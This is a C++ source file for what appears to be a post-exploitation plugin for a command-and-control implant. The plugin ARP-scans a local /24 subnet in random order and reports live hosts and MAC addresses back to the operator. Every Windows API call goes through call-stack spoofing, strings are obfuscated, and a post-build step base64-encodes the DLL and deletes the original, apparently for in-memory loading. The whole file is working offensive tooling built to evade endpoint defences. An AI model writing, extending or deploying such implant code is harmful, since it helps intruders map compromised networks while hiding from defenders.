#include <iostream>
#include <winsock2.h>
#include <iphlpapi.h>
#include <ws2tcpip.h>
#include <windows.h>
#include "CLite.h"
#include "Obfuscator.h"
#include "StackSpoofer.h"

/*
* ⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️
* 1.Release x64
* 2.常规: 平台工具集(LLVM (clang-cl))
* 3.C/C++
* 优化: 优化(已禁用)
* 代码生成: 启用 C++ 异常(否); 运行库(多线程); 安全检查(禁用安全检查)
* 4.链接器
* 输入: 附加依赖项(Stub.lib ws2_32.lib iphlpapi.lib); 忽略所有默认库(是)
* 清单文件: 生成清单(否)
* 调试: 生成调试信息(否)
* 高级: 入口点(ArpScan)
* 5.生成事件
* 生成后事件: 命令行(powershell -Command "[Convert]::ToBase64String([IO.File]::ReadAllBytes('$(OutDir)$(TargetFileName)')) | Out-File '$(OutDir)$(TargetName)_Base64.txt' -Encoding UTF8; Remove-Item '$(OutDir)$(TargetFileName)'")
*/

using namespace std;

char* id = NULL;
char* username = NULL;
int pause = 0;
int close = 0;
DWORD delay = 1000;
char* ipPrefix = NULL;

extern "C" __declspec(dllexport) void SetClose(char* argv[]) {
    close = 1;
}

extern "C" __declspec(dllexport) void SetDelay(char* argv[]) {
    delay = StrToInt(argv[2]);
}

extern "C" __declspec(dllexport) void SetPause(char* argv[]) {
    if (pause) {
        pause = 0;
    }
    else {
        pause = 1;
    }
}

void ArpSend(PTP_CALLBACK_INSTANCE instance, PVOID hostId) {
    char destIP[20];
    in_addr destAddr;
    char* format = OBFSTR("%s%d");
    SPOOF(wsprintfA, 4, destIP, format, ipPrefix, hostId);
    if (SPOOF(inet_pton, 3, AF_INET, destIP, &destAddr) == 1) {
        ULONG macAddr[2];
        ULONG physAddrLen = 6;
        if (SPOOF(SendARP, 4, destAddr.S_un.S_addr, 0, macAddr, &physAddrLen) == NO_ERROR) {
            char info[70];
            format = OBFSTR("[+] Host alive: %s - MAC: %02X-%02X-%02X-%02X-%02X-%02X\n");
            SPOOF(wsprintfA, 9, info, format, destIP, macAddr[0] & 0xFF, (macAddr[0] >> 8) & 0xFF, (macAddr[0] >> 16) & 0xFF, (macAddr[0] >> 24) & 0xFF, macAddr[1] & 0xFF, (macAddr[1] >> 8) & 0xFF);
            AsyncCommandOutput(id, username, info, NULL);
        }
    }
}

// Arp 主机存活探测 (异步)
// 一次扫描停止前不要再次调用 Scan
// 未对全局变量做异步保护, 尽管出错的概率很低, 也不要频繁调用(Delay; Pause; Close)
extern "C" __declspec(dllexport) void ArpScan(char* argv[]) {
    id = argv[0];
    username = argv[1];
    ipPrefix = argv[2];
    pause = 0;
    close = 0;
    SetDelay(argv + 1);

    // 打乱扫描顺序
    int hostIdList[256];
    for (size_t i = 0; i < 256; i++) {
        hostIdList[i] = i;
    }
    for (size_t i = 0; i < 256; i++) {
        size_t index1 = GetRand(256);
        size_t index2 = GetRand(256);
        int t = hostIdList[index1];
        hostIdList[index1] = hostIdList[index2];
        hostIdList[index2] = t;
    }

    // 扫描 C 段
    PTP_POOL pool = SPOOF(CreateThreadpool, 1, NULL);
    if (pool == NULL) {
        goto End;
    }
    SPOOF(SetThreadpoolThreadMaximum, 2, pool, 256);
    if (!SPOOF(SetThreadpoolThreadMinimum, 2, pool, 256)) {
        SPOOF(CloseThreadpool, 1, pool);
        goto End;
    }
    size_t index = 0;
    PTP_WORK works[256];
    for (size_t i = 0; i < 256; i++) {
        PTP_WORK work = SPOOF(CreateThreadpoolWork, 3, (PTP_WORK_CALLBACK)ArpSend, (PVOID)hostIdList[i], NULL);
        if (work != NULL) {
            SPOOF(SubmitThreadpoolWork, 1, work);
            works[index] = work;
            index++;
        }
        MySleep(delay);
        while (pause) {
            if (close) {
                break;
            }
            MySleep(5000);
        }
        if (close) {
            break;
        }
    }
    for (size_t i = 0; i < index; i++) {
        SPOOF(WaitForThreadpoolWorkCallbacks, 2, works[i], FALSE);
        SPOOF(CloseThreadpoolWork, 1, works[i]);
    }
    SPOOF(CloseThreadpool, 1, pool);
End:
    // 异步最多只能释放这四个 (不包括你主动申请的)
#ifndef _DEBUG
    SafeFree(id);
    SafeFree(username);
    SafeFree(argv[2]);
    SafeFree(argv);
#endif
}

#ifdef _DEBUG
int main() {
    char* argv[] = { "id", "Magician", "192.168.111.", "50" };
    ArpScan(argv);
}
#endif